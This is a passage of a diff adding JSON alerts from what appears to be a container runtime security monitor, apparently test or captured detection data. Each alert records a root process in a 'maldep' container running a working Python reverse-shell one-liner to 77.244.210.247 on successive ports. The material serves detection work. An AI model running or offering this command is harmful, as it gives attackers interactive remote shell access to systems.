+        "fd.name": "0.0.0.0:51834->77.244.210.247:22877",
+        "container.id": "3915af6ed50f",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "user.name": "root",
+        "container.image.repository": "maldep",
+        "evt.time": "09:07:02.072233771"
+      },
+      "time": {
+        "seconds": "1764752822",
+        "nanos": 72233771
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:02.072233771: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22877)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:51834->77.244.210.247:22877 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.id": "3915af6ed50f",
+        "container.image.repository": "maldep",
+        "fd.name": "0.0.0.0:41428->77.244.210.247:22878",
+        "user.name": "root",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22878)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "evt.time": "09:07:02.559764871"
+      },
+      "time": {
+        "seconds": "1764752822",
+        "nanos": 559764871
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:02.559764871: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22878)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:41428->77.244.210.247:22878 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "evt.time": "09:07:03.031005856",
+        "container.id": "3915af6ed50f",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22879)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "user.name": "root",
+        "container.image.repository": "maldep",
+        "fd.name": "0.0.0.0:37388->77.244.210.247:22879"
+      },
+      "time": {
+        "seconds": "1764752823",
+        "nanos": 31005856
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:03.031005856: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22879)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:37388->77.244.210.247:22879 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "fd.name": "0.0.0.0:47594->77.244.210.247:22880",
+        "user.name": "root",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "evt.time": "09:07:03.503697945",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22880)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.image.repository": "maldep",
+        "container.id": "3915af6ed50f"
+      },
+      "time": {
+        "seconds": "1764752823",
+        "nanos": 503697945
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:03.503697945: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22880)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:47594->77.244.210.247:22880 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.id": "3915af6ed50f",
+        "container.image.repository": "maldep",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "user.name": "root",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22881)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "evt.time": "09:07:03.829766080",
+        "fd.name": "0.0.0.0:57882->77.244.210.247:22881"
+      },
+      "time": {
+        "seconds": "1764752823",
+        "nanos": 829766080
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:03.829766080: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22881)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:57882->77.244.210.247:22881 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "user.name": "root",
+        "container.image.repository": "maldep",
+        "container.id": "3915af6ed50f",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22882)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "fd.name": "0.0.0.0:39174->77.244.210.247:22882",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "evt.time": "09:07:05.377018638"
+      },
+      "time": {
+        "seconds": "1764752825",
+        "nanos": 377018638
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:05.377018638: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22882)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:39174->77.244.210.247:22882 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "fd.name": "0.0.0.0:43136->77.244.210.247:22883",
+        "container.image.repository": "maldep",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22883)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "user.name": "root",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.id": "3915af6ed50f",
+        "evt.time": "09:07:05.756820094"
+      },
+      "time": {
+        "seconds": "1764752825",
+        "nanos": 756820094
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:05.756820094: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22883)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:43136->77.244.210.247:22883 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.image.repository": "maldep",
+        "user.name": "root",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22884)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.id": "3915af6ed50f",
+        "evt.time": "09:07:06.101482398",
+        "fd.name": "0.0.0.0:36994->77.244.210.247:22884"
+      },
+      "time": {
+        "seconds": "1764752826",
+        "nanos": 101482398
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:06.101482398: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22884)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:36994->77.244.210.247:22884 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.image.repository": "maldep",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22885)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "evt.time": "09:07:06.555003753",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "user.name": "root",
+        "container.id": "3915af6ed50f",
+        "fd.name": "0.0.0.0:38872->77.244.210.247:22885"
+      },
+      "time": {
+        "seconds": "1764752826",
+        "nanos": 555003753
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:06.555003753: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22885)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:38872->77.244.210.247:22885 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.id": "3915af6ed50f",
+        "fd.name": "0.0.0.0:35766->77.244.210.247:22886",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.image.repository": "maldep",
+        "evt.time": "09:07:06.898359931",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22886)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "user.name": "root"
+      },
+      "time": {
+        "seconds": "1764752826",
+        "nanos": 898359931
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:06.898359931: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22886)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:35766->77.244.210.247:22886 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.image.repository": "maldep",
+        "user.name": "root",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22887)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.id": "3915af6ed50f",
+        "evt.time": "09:07:07.356170496",
+        "fd.name": "0.0.0.0:47700->77.244.210.247:22887"
+      },
+      "time": {
+        "seconds": "1764752827",
+        "nanos": 356170496
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:07.356170496: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22887)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:47700->77.244.210.247:22887 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "user.name": "root",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "evt.time": "09:07:07.842877783",
+        "fd.name": "0.0.0.0:44462->77.244.210.247:22888",
+        "container.image.repository": "maldep",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22888)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.id": "3915af6ed50f"
+      },
+      "time": {
+        "seconds": "1764752827",
+        "nanos": 842877783
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:07.842877783: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22888)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:44462->77.244.210.247:22888 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "fd.name": "0.0.0.0:49402->77.244.210.247:22889",
+        "evt.time": "09:07:08.322398449",
+        "container.id": "3915af6ed50f",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22889)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "user.name": "root",
+        "container.image.repository": "maldep",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz"
+      },
+      "time": {
+        "seconds": "1764752828",
+        "nanos": 322398449
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:08.322398449: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22889)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:49402->77.244.210.247:22889 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "fd.name": "0.0.0.0:46748->77.244.210.247:22890",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22890)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "user.name": "root",
+        "container.id": "3915af6ed50f",
+        "evt.time": "09:07:08.804293149",
+        "container.image.repository": "maldep"
+      },
+      "time": {
+        "seconds": "1764752828",
+        "nanos": 804293149
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:08.804293149: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22890)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:46748->77.244.210.247:22890 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.id": "3915af6ed50f",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22891)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.image.repository": "maldep",
+        "user.name": "root",
+        "fd.name": "0.0.0.0:41024->77.244.210.247:22891",
+        "evt.time": "09:07:09.176834131"
+      },
+      "time": {
+        "seconds": "1764752829",
+        "nanos": 176834131
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:09.176834131: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22891)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:41024->77.244.210.247:22891 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "fd.name": "0.0.0.0:33352->77.244.210.247:22892",
+        "evt.time": "09:07:09.593356058",
+        "user.name": "root",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22892)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.id": "3915af6ed50f",
+        "container.image.repository": "maldep"
+      },
+      "time": {
+        "seconds": "1764752829",
+        "nanos": 593356058
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:09.593356058: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22892)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:33352->77.244.210.247:22892 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.id": "3915af6ed50f",
+        "fd.name": "0.0.0.0:39716->77.244.210.247:22893",
+        "evt.time": "09:07:09.935939829",
+        "container.image.repository": "maldep",
+        "user.name": "root",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22893)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);"
+      },
+      "time": {
+        "seconds": "1764752829",
+        "nanos": 935939829
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:09.935939829: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22893)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:39716->77.244.210.247:22893 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "evt.time": "09:07:10.280858515",
+        "container.id": "3915af6ed50f",
+        "user.name": "root",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22894)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "fd.name": "0.0.0.0:42552->77.244.210.247:22894",
+        "container.image.repository": "maldep"
+      },
+      "time": {
+        "seconds": "1764752830",
+        "nanos": 280858515
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:10.280858515: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22894)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:42552->77.244.210.247:22894 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22895)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.image.repository": "maldep",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "evt.time": "09:07:10.715535020",
+        "container.id": "3915af6ed50f",
+        "user.name": "root",
+        "fd.name": "0.0.0.0:56270->77.244.210.247:22895"
+      },
+      "time": {
+        "seconds": "1764752830",
+        "nanos": 715535020
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:10.715535020: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22895)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:56270->77.244.210.247:22895 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.image.repository": "maldep",
+        "user.name": "root",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22896)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.id": "3915af6ed50f",
+        "fd.name": "0.0.0.0:47658->77.244.210.247:22896",
+        "evt.time": "09:07:11.036493411",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz"
+      },
+      "time": {
+        "seconds": "1764752831",
+        "nanos": 36493411
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:11.036493411: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22896)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:47658->77.244.210.247:22896 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22897)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "user.name": "root",
+        "evt.time": "09:07:11.385085199",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.id": "3915af6ed50f",
+        "container.image.repository": "maldep",
+        "fd.name": "0.0.0.0:56434->77.244.210.247:22897"
+      },
+      "time": {
+        "seconds": "1764752831",
+        "nanos": 385085199
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:11.385085199: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22897)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:56434->77.244.210.247:22897 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "evt.time": "09:07:11.841623437",
+        "fd.name": "0.0.0.0:60196->77.244.210.247:22898",
+        "container.id": "3915af6ed50f",
+        "container.image.repository": "maldep",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "user.name": "root",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22898)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);"
+      },
+      "time": {
+        "seconds": "1764752831",
+        "nanos": 841623437
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:11.841623437: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22898)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:60196->77.244.210.247:22898 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.id": "3915af6ed50f",
+        "fd.name": "0.0.0.0:34266->77.244.210.247:22899",
+        "evt.time": "09:07:12.315718995",
+        "user.name": "root",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.image.repository": "maldep",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22899)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);"
+      },
